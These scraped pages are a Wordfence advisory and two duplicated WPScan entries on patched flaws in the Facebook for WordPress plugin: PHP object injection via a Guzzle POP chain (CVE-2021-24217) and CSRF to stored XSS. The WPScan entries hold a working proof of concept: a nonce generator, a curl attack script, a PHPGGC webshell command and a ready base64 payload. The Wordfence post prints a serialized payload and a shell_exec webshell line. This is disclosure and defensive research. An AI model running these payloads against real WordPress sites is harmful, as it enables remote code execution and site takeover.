=== Content from www.wordfence.com_7204b26a_20250114_182901.html ===


![](https://www.wordfence.com/wp-content/uploads/2021/03/Two-Vulnerabilities-Patched-in-Facebook-for-WordPress-Plugin.jpg)

[![](https://secure.gravatar.com/avatar/9bf72594e071c28445ed7a1be0de1a23?s=80&d=mm&r=g)Chloe Chamberland](https://www.wordfence.com/blog/author/wfchloe/)

March 25, 2021

# Two Vulnerabilities Patched in Facebook for WordPress Plugin

On December 22, 2020, our Threat Intelligence team responsibly disclosed a vulnerability in [Facebook for WordPress](https://wordpress.org/plugins/official-facebook-pixel/), formerly known as Official Facebook Pixel, a WordPress plugin installed on over 500,000 sites. This flaw made it possible for unauthenticated attackers with access to a site’s secret salts and keys to achieve remote code execution through a deserialization weakness.

In addition, on January 27, 2021, we disclosed a separately identified vulnerability in Facebook for WordPress that was introduced in the rebranding of the plugin in version 3.0.0. This flaw made it possible for attackers to inject malicious JavaScript into the plugin’s settings, if an attacker could successfully trick an administrator into performing an action such as clicking a link.

We initially reached out to Facebook’s security team on December 22, 2020 for the first vulnerability and included the full disclosure details at the time of reaching out. They initially responded on December 25, 2020 requesting further information which was supplied on December 26, 2020. A patch was released on January 6, 2021.

For the second vulnerability, we reached out to Facebook’s security team again on January 27, 2021 and included the full disclosure details at the time of reaching out. They initially responded on February 1, 2021 requesting further information which was supplied the same day. An initial patch was released on February 12, 2021, and a fully sufficient patch was released on February 17, 2021.

These are considered high and critical severity vulnerabilities. Therefore, we highly recommend updating to the latest version available containing both patches, 3.0.5, immediately.

Wordfence Premium users received a firewall rule to protect exploit attempts against the first vulnerability on December 22, 2020 and received a firewall rule to protect exploit attempts against the second vulnerability on January 27, 2021. Sites still using the free version of Wordfence received the same protection for the first vulnerability on January 21, 2020 and on February 26, 2021 for the second vulnerability.

## PHP Object Injection

**Description:** PHP Object Injection with POP Chain

**Affected Plugin:** Facebook for WordPress, *formerly known as Official Facebook Pixel*

**Plugin Slug:** official-facebook-pixel

**Affected Versions:** < =2.2.2

**CVE ID:** [CVE-2021-24217](https://wpscan.com/vulnerability/509f2754-a1a1-4142-9126-ae023a88533a)

**CVSS Score:** 9.0 (CRITICAL)

**CVSS Vector:** [CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Fully Patched Version:** 3.0.0

Facebook for WordPress is a plugin designed to create a seamless integration between Facebook Pixel, a conversion measurement tool, and a WordPress site. The plugin will monitor site traffic and record data when users access pages and perform certain actions on a site.

The plugin registered an `admin_post` action, `admin_post_wp_async_send_server_event`, so that both the ViewContent and AddToCart events would be triggered at the same time when WooCommerce customers added products to their cart.

```
public function __construct( $auth_level = self::BOTH ) {
   if ( empty( $this->action ) ) {
      throw new Exception( 'Action not defined for class ' . __CLASS__ );
   }
   add_action( $this->action, array( $this, 'launch' ), (int) $this->priority, (int) $this->argument_count );
   if ( $auth_level & self::LOGGED_IN ) {
      add_action( "admin_post_wp_async_$this->action", array( $this, 'handle_postback' ) );
   }
   if ( $auth_level & self::LOGGED_OUT ) {
      add_action( "admin_post_nopriv_wp_async_$this->action", array( $this, 'handle_postback' ) );
   }
}</pre>
<pre>
```

This action was hooked to the `handle_postback` function that ultimately checked for a valid nonce and triggered the `run_action()` function when a valid nonce was supplied.

```
public function handle_postback() {
   if ( isset( $_POST['_nonce'] ) && $this->verify_async_nonce( $_POST['_nonce'] ) ) {
      if ( ! is_user_logged_in() ) {
         $this->action = "nopriv_$this->action";
      }
      $this->run_action();
   }

   add_filter( 'wp_die_handler', function() { die(); } );
   wp_die();
}</pre>
<pre>
```

Due to the `handle_postback` function requiring a valid nonce, an attacker would need a valid nonce in order to exploit this vulnerability. The generated nonce did not use normal user data when creating a nonce, making the nonce unrelated to any user sessions. We discovered that this nonce could easily be generated with a custom script. This required that an attacker gain access to the site’s nonce salt and key either through a SQL injection vulnerability, a directory traversal vulnerability, or a publicly accessible backup of the `wp-config.php` file.

The core of the PHP Object Injection vulnerability was within the `run_action()` function. This function was intended to deserialize user data from the `event_data` POST variable so that it could send the data to the pixel console. Unfortunately, this `event_data` could be supplied by a user. When user-supplied input is deserialized in PHP, users can supply PHP objects that can trigger magic methods and execute actions that can be used for malicious purposes.

```
protected function run_action() {
  try {
    $num_events = $_POST['num_events'];
    if( $num_events == 0 ){
      return;
    }
    $events = unserialize(base64_decode($_POST['event_data']));
    // When an array has just one object, the deserialization process
    // returns just the object
    // and we want an array
    if( $num_events == 1 ){
      $events = array( $events );
    }

    FacebookServerSideEvent::send($events);
  }</pre>
<pre>
```

On its own, a deserialization vulnerability is relatively harmless, however, when combined with a gadget, or magic method, significant damage can be done to a site. In this case, we did find a magic method within the plugin that could be used to upload arbitrary files and achieve remote code execution on a vulnerable target.

## The Complete POP Chain

The Facebook for WordPress plugin uses Guzzle, a PHP HTTP client, which has the `__destruct` magic method used in the FileCookieJar class. This method saves a file when shutting down to store sessions cookies. This meant that a properly constructed payload that calls the FileCookieJar class could allow an attacker to create a file.

```
<?php
namespace GuzzleHttp\Cookie;

/**
 * Persists non-session cookies using a JSON formatted file
 */
class FileCookieJar extends CookieJar
{
    /** @var string filename */
    private $filename;

    /** @var bool Control whether to persist session cookies or not. */
    private $storeSessionCookies;
```
```
/**
 * Saves the file when shutting down
 */
public function __destruct()
{
    $this->save($this->filename);
}

/**
 * Saves the cookies to a file.
 *
 * @param string $filename File to save
 * @throws \RuntimeException if the file cannot be found or created
 */
public function save($filename)
{
    $json = [];
    foreach ($this as $cookie) {
        /** @var SetCookie $cookie */
        if (CookieJar::shouldPersist($cookie, $this->storeSessionCookies)) {
            $json[] = $cookie->toArray();
        }
    }

    $jsonStr = \GuzzleHttp\json_encode($json);
    if (false === file_put_contents($filename, $jsonStr, LOCK_EX)) {
        throw new \RuntimeException("Unable to save file {$filename}");
    }
}
```

We were able to construct the following payload, with the use of an external tool, PHPGGC, that calls the FileCookieJar class once deserialized. This payload sets the FileCookieJar filename to `/var/www/html/new.php`, which is the path and filename of the file that will be created during deserialization. The SetCookie data parameter sets the malicious PHP payload in the newly created file to:`<?php phpinfo();?>`. Finally, it also sets a few other values like FileCookieJar storeSessionCookies to enabled and SetCookie to true.

```
O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:41:"GuzzleHttp\Cookie\FileCookieJar*filename";s:21:"/var/www/html/new.php";s:52:"GuzzleHttp\Cookie\FileCookieJar*storeSessionCookies";b:1;s:36:"GuzzleHttp\Cookie\CookieJar*cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:"GuzzleHttp\Cookie\SetCookie*data";a:5:{s:4:"Name";s:4:"test";s:5:"Value";s:18:"<?php phpinfo();?>";s:7:"Discard";b:0;s:7:"Expires";i:1;}}}s:39:"GuzzleHttp\Cookie\CookieJarstrictMode";N;}
```

This meant that an attacker could generate a PHP file new.php in a vulnerable site’s home directory with the contents `<?php phpinfo();?>`. The PHP file contents could be changed to anything, like `<?php shell_exec($_GET['cmd']);?>`  which would allow an attacker to achieve remote code execution.

Note that the presence of a full POP chain also meant that any other plugin with an object injection vulnerability, including those that did not require knowledge of the site’s salts and keys, could potentially be used to achieve remote code execution as well if it was installed on a site with the Facebook for WordPress plugin.

## Cross-Site Request Forgery

**Description:** Cross-Site Request Forgery to Stored Cross-Site Scripting

**Affected Plugin:** Facebook for WordPress, *formerly known as Official Facebook Pixel*

**Plugin Slug:** official-facebook-pixel

**Affected Versions:** 3.0.0 – 3.0.3

**CVE ID:** [CVE-2021-24218](https://wpscan.com/vulnerability/169d21fc-d191-46ff-82e8-9ac887aed8a4)

**CVSS Score:** 8.8 (High)

**CVSS Vector:** [CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)

**Fully Patched Version:** 3.0.4

In addition to the PHP Object Injection vulnerability, we discovered a Cross-Site Request Forgery to Stored Cross-Site Scripting vulnerability in the updated version of the plugin. In version 3.0.0, the developers rewrote much of the plugin’s code while rebranding and introducing some new functionality.

One of the changes they made while updating the plugin addressed the functionality behind saving the plugin’s settings. This was converted to an AJAX action to make the integration process more seamless. The new version introduced the `wp_ajax_save_fbe_settings` AJAX action tied to the `saveFbeSettings` function.

```
 public function init(){
        add_action('wp_ajax_save_fbe_settings', array($this, 'saveFbeSettings'));
        add_action('wp_ajax_delete_fbe_settings',
        array($this, 'deleteFbeSettings')
        );
    }
```

This function is used to update the plugin’s settings with the Facebook Pixel ID, access token, and external business key. These settings help establish a connection with the Facebook pixel console so that event data can be sent from the WordPress site to the appropriate Facebook pixel account.

```
public function saveFbeSettings(){
    if (!current_user_can('administrator')) {
        $this->handleUnauthorizedRequest();
    }
    $pixel_id = $_POST['pixelId'];
    $access_token = $_POST['accessToken'];
    $external_business_id = $_POST['externalBusinessId'];
    $settings = array(
        FacebookPluginConfig::PIXEL_ID_KEY => $pixel_id,
        FacebookPluginConfig::ACCESS_TOKEN_KEY => $access_token,
        FacebookPluginConfig::EXTERNAL_BUSINESS_ID_KEY =>
            $external_business_id,
        FacebookPluginConfig::IS_FBE_INSTALLED_KEY => '1'
    );
    \update_option(
        FacebookPluginConfig::SETTINGS_KEY,
        $settings
    );
    return $this->handleSuccessRequest($settings);
}
```

There was a permission check on this function, blocking users lower than administrators from being able to access it, however, there was no nonce protection. This meant that there was no verification that a request was coming from a legitimate authenticated administrator session. This made it possible for attackers to craft a request that would be executed if they could trick an administrator into performing an action while authenticated to the target site.

The action could be used by an attacker to update the plugin’s settings to point to their own Facebook Pixel console and steal metric data for a site. Worse yet, since there was no sanitization on the settings that were stored, an attacker could inject malicious JavaScript into the setting values. These values would then be reflected on the settings page, causing the code to execute in a site administrator’s browser while accessing the settings page. Ultimately, this code could be used to inject malicious backdoors into theme files or create new administrative user accounts that could be used for complete site takeover.

In addition to the AJAX action used to update settings, there was an AJAX action `wp_ajax_delete_fbe_settings` hooked to the `deleteFbeSettings` function. This function was used to erase the plugin’s settings. It also lacked the appropriate nonce protection, making it possible for attackers to reset plugin settings through CSRF. Though it could be annoying for the plugin’s settings to be reset, and it could cause a brief loss of metric data, there was no overly impactful harm that could be done on a WordPress site with this vulnerability.

## Disclosure Timeline [PHP Object Injection]

**December 22, 2020** – Conclusion of the plugin analysis that led to the discovery of the PHP Object Injection vulnerability in Facebook for WordPress. We develop firewall rules to protect Wordfence customers and release them to Wordfence Premium users. We initiate contact with the Facebook Pixel security team. We receive automated responses confirming receipt of our report.

**December 25, 2020** – We receive a response requesting additional information.

**December 28, 2020** – We send additional requested details.

**January 4, 2021** – We receive confirmation that the plugin developers were able to duplicate our report and have begun working on a fix.

**January 6, 2021** – A patched version of the plugin is released as version 3.0.0. We verify that the vulnerability has been patched.

**January 21, 2021** – Free Wordfence users receive firewall rule.

## Disclosure Timeline [CSRF to Stored XSS]

**January 27, 2021** – Conclusion of the plugin analysis that led to the discovery of the CSRF to Stored XSS vulnerability in Facebook for WordPress. We develop firewall rules to protect Wordfence customers and release them to Wordfence Premium users. We initiate contact with the Facebook Pixel security team. We receive automated responses confirming receipt of our report.

**February 1, 2021** – We receive a response requesting additional information. We send additional details the same day.

**February 5, 2021** – We receive confirmation that the plugin developers were able to duplicate our report and have begun working on a fix.

**February 12, 2021** – A patched version of the plugin is released as version 3.0.3.

**February 15, 2021** –We follow up to inform the plugin developers of missing sanitization on the stored settings leading to an insufficient patch.

**February 17, 2021** – An additional and fully sufficient patch is released.

**February 26, 2021** – Free Wordfence users receive firewall rule.

## Conclusion

In today’s post, we detailed two flaws in the Facebook for WordPress plugin that granted attackers the ability to achieve remote code execution due to a PHP Object Injection vulnerability and inject malicious JavaScript due to a CSRF vulnerability, both of which can be used for complete site takeover. The flaws are both fully patched in version 3.0.4. We recommend that users immediately update to the latest version available, which is version 3.0.5 at the time of this publication.

[Wordfence Premium](https://www.wordfence.com/wordfence-signup/?promo_id=blog20210324&promo_name=get-premium&promo_creative=txt&promo_position=conclusion) users received firewall rules protecting against the first vulnerability on December 22, 2020 and the second vulnerability on January 27, 2021, while those still using the free version of Wordfence received the same protection for the first vulnerability on January 21, 2020 and on February 26, 2021 for the second vulnerability.

If you know a friend or colleague who is using this plugin on their site, we highly recommend forwarding this advisory to them to help keep their sites protected as these are severe vulnerabilities that can result in remote code execution and full site compromise.

Search

### Trust Your Site to the Leader in WordPress Security

Wordfence includes an endpoint firewall, malware scanner, robust login security features, live traffic views, and more. Discover why over 5 million WordPress sites put their trust in Wordfence.

[Protect Your Site](/products/pricing/)

**Did you enjoy this post? Share it!**

[*Facebook*](http://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F03%2Ftwo-vulnerabilities-patched-in-facebook-for-wordpress-plugin%2F)
[*Twitter*](https://twitter.com/share?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F03%2Ftwo-vulnerabilities-patched-in-facebook-for-wordpress-plugin%2F&text=Two%20Vulnerabilities%20Patched%20in%20Facebook%20for%20WordPress%20Plugin&via=wordfence)
[*LinkedIn*](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F03%2Ftwo-vulnerabilities-patched-in-facebook-for-wordpress-plugin%2F)

## Comments

2 Comments

* ![](https://secure.gravatar.com/avatar/647d78460dc9835dff76197c13fefc76?s=96&d=mm&r=g)
  Robert
  March 26, 2021
   7:13 am

  How about the "Facebook for woocommerce" plugin is it also affected, they seem to share a decent amount of code base?

+ ![](https://secure.gravatar.com/avatar/9bf72594e071c28445ed7a1be0de1a23?s=96&d=mm&r=g)
  Chloe Chamberland
  March 29, 2021
   9:28 am

  Hi Robert,

  This does not affect the "Facebook for WooCommerce" plugin.

  Thanks!

### Breaking WordPress Security Research in your inbox as it happens.

![Example of a news story](/img/footer-news-example.jpg)

This site uses cookies in accordance with our [Privacy Policy](/privacy-policy).

Cookie Settings
Accept All

## Cookie Options

For additional information on how this site uses cookies, please review our [Privacy Policy](/privacy-policy). The cookies used by this site are classified into the following categories and can be configured below.

### Strictly Necessary

These Cookies are necessary for the Sites and Services to work properly. They include any essential authentication and authorization cookies for the Services.

\* Cookies of this category are necessary for the site to function and cannot be disabled.

### Performance/Analytical

These Cookies allow us to collect certain information about how you navigate the Sites or utilize the Services running on your device. They help us understand which areas you use and what we can do to improve them.

### Targeting

These Cookies are used to deliver relevant information related to the Services to an identified machine or other device (not a named or otherwise identifiable person) which has previously been used to visit our Sites. Some of these types of Cookies on our Sites are operated by third parties with our permission and are used to identify advertising sources that are effectively driving customers to our Sites.

Cancel
Save



=== Content from wpscan.com_cbac14de_20250114_182900.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Facebook for WordPress < 3.0.0 - PHP Object Injection with POP Chain

### Description

The run\_action function of the plugin deserializes user supplied data making it possible for PHP objects to be supplied creating an Object Injection vulnerability. There was also a useable magic method in the plugin that could be used to achieve remote code execution.

### Proof of Concept

Step 1: Use the nonce generation script to generate a valid nonce.
Step 2: Run the POC script like:
php poc.php site.com nonce base64payload
Step 3: Navigate to the shell
http://mysite.com/webshell.php
Nonce Generation Script
-----
<?php
$nonce\_key = '[SITE NONCE KEY HERE]';
$nonce\_salt = '[SITE SALT HERE]';
function wp\_nonce\_tick() {
return ceil( time() / ( 86400 / 2 ) );
}
function wp\_hash( $data, $scheme = 'auth', $nonce\_key, $nonce\_salt) {
$salt = $nonce\_key . $nonce\_salt;
echo "Is this a real salt? " . $salt . "\n";
return hash\_hmac( 'md5', $data, $salt );
}
$i = wp\_nonce\_tick();
echo "Here is your Nonce: " . substr( wp\_hash( $i ."wp\_async\_send\_server\_eventsFacebookPixelPlugin\Core\ServerEventAsyncTask", 'nonce', $nonce\_key,
$nonce\_salt), - 12, 10 )
?>
PoC Script
<?php
// Settings
$siteurl = $argv[1];
$nonce = $argv[2];
$payload = $argv[3];
$ch = curl\_init();
curl\_setopt( $ch, CURLOPT\_URL, $siteurl . '/wp-admin/admin-post.php' );
curl\_setopt( $ch, CURLOPT\_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13' );
curl\_setopt( $ch, CURLOPT\_PROXY, $proxy );
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt( $ch, CURLOPT\_RETURNTRANSFER, true );
curl\_setopt( $ch, CURLOPT\_FOLLOWLOCATION, true );
curl\_setopt( $ch, CURLOPT\_POST, true );
curl\_setopt( $ch, CURLOPT\_POSTFIELDS, [
'action' => 'wp\_async\_send\_server\_events',
'\_nonce' => $nonce,
'num\_events' => '1',
'event\_data' => $payload
] );
$output = curl\_exec($ch);
curl\_close($ch);
print\_r($output);
?>
Generate a working payload with PHPGGC, or other custom script - make sure data is base64encoded on output so null characters don't get lost.
./phpggc Guzzle/FW1 /var/www/html/webshell.php ~/path/to/shell.php -b
Sometimes the payload is finicky so you may need to take the payload into Burp Decoder to decode and modify your payload while keeping the null characters. The following payload should work on most standard instances:
TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6MjY6Ii92YXIvd3d3L2h0bWwvd2Vic2hlbGwucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTo1OntzOjQ6Ik5hbWUiO3M6NDoidGVzdCI7czo1OiJWYWx1ZSI7czoxODoiPD9waHAgcGhwaW5mbygpOz8+IjtzOjc6IkRpc2NhcmQiO2I6MDtzOjc6IkV4cGlyZXMiO2k6MTt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047fQ==

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

official-facebook-pixel](https://a8cteam5105.wordpress.com/plugin/official-facebook-pixel/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 3.0.0

### References

CVE
[CVE-2021-24217](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24217)

URL
<https://www.wordfence.com/blog/2021/03/two-vulnerabilities-patched-in-facebook-for-wordpress-plugin/>

### Classification

Type
OBJECT INJECTION

OWASP top 10
[A8: Insecure Deserialization](https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization)

CWE
[CWE-502](https://cwe.mitre.org/data/definitions/502.html)

CVSS
[9.0 (critical)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H)

### Miscellaneous

Original Researcher
Chloe Chamberland

Submitter
Chloe Chamberland

Submitter website
<https://wordfence.com>

Submitter twitter
[infosecchloe](//twitter.com/infosecchloe)

Verified
Yes

WPVDB ID
[509f2754-a1a1-4142-9126-ae023a88533a](https://a8cteam5105.wordpress.com/vulnerability/509f2754-a1a1-4142-9126-ae023a88533a/)

### Timeline

Publicly Published
2021-03-25 (about 3 years ago)

Added
2021-03-25 (about 3 years ago)

Last Updated
2021-03-26 (about 3 years ago)

### Other

Published
Title

Published
2024-10-14
Title
[Recently <= 1.1 - Unauthenticated PHP Object Injection](https://a8cteam5105.wordpress.com/vulnerability/ddb89f43-d6f0-4c8e-9136-6de0c50709b4/)

Published
2024-03-26
Title
[ARMember – Membership Plugin, Content Restriction, Member Levels, User Profile & User signup < 4.0.27 - Authenticated (Contributor+) PHP Object Injection](https://a8cteam5105.wordpress.com/vulnerability/c2f39736-4e7c-4a4b-adad-a708aa9fbc1b/)

Published
2024-10-14
Title
[TAKETIN To WP Membership <= 2.8.1 - Subscriber+ PHP Object Injection](https://a8cteam5105.wordpress.com/vulnerability/096c7e0d-4d5d-4856-abc6-7fcb41388c61/)

Published
2024-04-11
Title
[WPvivid Backup & Migration Plugin < 0.9.100 - Admin+ PHAR Deserialization](https://a8cteam5105.wordpress.com/vulnerability/132dec1f-836a-4236-84f0-c49090223865/)

Published
2017-01-25
Title
[InfiniteWP Client < 1.6.1.1 - Unauthenticated PHP Object Injection](https://a8cteam5105.wordpress.com/vulnerability/e4c6d4bf-69d5-4edd-ae7d-46468373b378/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)


=== Content from wpscan.com_cbac14de_20250115_112559.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Facebook for WordPress < 3.0.0 - PHP Object Injection with POP Chain

### Description

The run\_action function of the plugin deserializes user supplied data making it possible for PHP objects to be supplied creating an Object Injection vulnerability. There was also a useable magic method in the plugin that could be used to achieve remote code execution.

### Proof of Concept

Step 1: Use the nonce generation script to generate a valid nonce.
Step 2: Run the POC script like:
php poc.php site.com nonce base64payload
Step 3: Navigate to the shell
http://mysite.com/webshell.php
Nonce Generation Script
-----
<?php
$nonce\_key = '[SITE NONCE KEY HERE]';
$nonce\_salt = '[SITE SALT HERE]';
function wp\_nonce\_tick() {
return ceil( time() / ( 86400 / 2 ) );
}
function wp\_hash( $data, $scheme = 'auth', $nonce\_key, $nonce\_salt) {
$salt = $nonce\_key . $nonce\_salt;
echo "Is this a real salt? " . $salt . "\n";
return hash\_hmac( 'md5', $data, $salt );
}
$i = wp\_nonce\_tick();
echo "Here is your Nonce: " . substr( wp\_hash( $i ."wp\_async\_send\_server\_eventsFacebookPixelPlugin\Core\ServerEventAsyncTask", 'nonce', $nonce\_key,
$nonce\_salt), - 12, 10 )
?>
PoC Script
<?php
// Settings
$siteurl = $argv[1];
$nonce = $argv[2];
$payload = $argv[3];
$ch = curl\_init();
curl\_setopt( $ch, CURLOPT\_URL, $siteurl . '/wp-admin/admin-post.php' );
curl\_setopt( $ch, CURLOPT\_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13' );
curl\_setopt( $ch, CURLOPT\_PROXY, $proxy );
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt( $ch, CURLOPT\_RETURNTRANSFER, true );
curl\_setopt( $ch, CURLOPT\_FOLLOWLOCATION, true );
curl\_setopt( $ch, CURLOPT\_POST, true );
curl\_setopt( $ch, CURLOPT\_POSTFIELDS, [
'action' => 'wp\_async\_send\_server\_events',
'\_nonce' => $nonce,
'num\_events' => '1',
'event\_data' => $payload
] );
$output = curl\_exec($ch);
curl\_close($ch);
print\_r($output);
?>
Generate a working payload with PHPGGC, or other custom script - make sure data is base64encoded on output so null characters don't get lost.
./phpggc Guzzle/FW1 /var/www/html/webshell.php ~/path/to/shell.php -b
Sometimes the payload is finicky so you may need to take the payload into Burp Decoder to decode and modify your payload while keeping the null characters. The following payload should work on most standard instances:
TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6MjY6Ii92YXIvd3d3L2h0bWwvd2Vic2hlbGwucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTo1OntzOjQ6Ik5hbWUiO3M6NDoidGVzdCI7czo1OiJWYWx1ZSI7czoxODoiPD9waHAgcGhwaW5mbygpOz8+IjtzOjc6IkRpc2NhcmQiO2I6MDtzOjc6IkV4cGlyZXMiO2k6MTt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047fQ==

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

official-facebook-pixel](https://a8cteam5105.wordpress.com/plugin/official-facebook-pixel/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 3.0.0

### References

CVE
[CVE-2021-24217](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24217)

URL
<https://www.wordfence.com/blog/2021/03/two-vulnerabilities-patched-in-facebook-for-wordpress-plugin/>

### Classification

Type
OBJECT INJECTION

OWASP top 10
[A8: Insecure Deserialization](https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization)

CWE
[CWE-502](https://cwe.mitre.org/data/definitions/502.html)

CVSS
[9.0 (critical)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H)

